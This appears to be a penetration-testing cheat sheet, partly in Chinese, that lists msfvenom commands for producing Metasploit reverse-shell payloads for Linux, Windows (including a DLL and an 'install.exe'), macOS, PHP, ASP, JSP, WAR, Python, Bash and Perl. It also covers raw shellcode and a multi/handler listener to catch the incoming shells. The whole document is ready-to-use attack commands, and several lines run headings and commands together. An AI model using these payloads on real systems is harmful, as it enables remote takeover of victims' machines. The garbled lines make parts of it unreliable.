# msfs生成各种payload
## msfvencom -l
#### Linux
`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=14704 -f elf >/var/www/html/shell.elf`
#### Windows
  `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=16041 -f exe >/var/www/html/pt16041.exe`
  
  `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=6666 -f exe >/var/www/html/install.exe`
#### Mac
  `msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.machoWeb Payloads`
#### PHP
  `msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.phpcat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php &&pbpaste >> shell.php`

#### ASP
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp`

#### JSP
`msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp`

#### WAR
`msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to ConnectOn> -f war > shell.warScripting Payloads`
#### Python
`msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py`
#### Bash
`msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh`
#### Perl
`msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl`
## SellCode
#### Linux Based SellCode
`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>`
#### Windows Based Shellcode
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>`
#### Mac Based Shellcode
`msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>`
#### Handlers
`Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.`
#### 生成dll文件
`msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=127.0.0.1 lport=10975 -f dll -o /var/www/html/x64.dll`

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <LHOST value>
set LPORT <LPORT value>
set ExitOnSession falseexploit -j -z
```



